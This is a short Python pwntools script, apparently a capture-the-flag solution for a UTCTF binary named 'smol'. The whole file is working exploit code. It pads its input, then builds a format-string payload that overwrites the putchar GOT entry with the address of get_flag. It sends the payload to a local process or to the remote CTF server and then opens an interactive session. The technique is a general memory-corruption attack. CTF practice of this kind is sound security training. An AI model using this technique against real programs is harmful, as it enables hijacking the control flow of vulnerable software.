#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./smol',checksec=False)

if args.REMOTE:
	p = remote('pwn.utctf.live', 5004)
else:
	p = process(binary.path)

offset = (0x158 - 233 + 1) // 8 + 6

payload  = b''
payload += (0x158 - 233 + 1) * b'A'
payload += fmtstr_payload(offset,{binary.got.putchar:binary.sym.get_flag})

assert(len(payload) < (0x158 - 0x78))

p.sendlineafter(b'have?\n',payload)
p.sendlineafter(b'data\n',b'')
p.interactive()
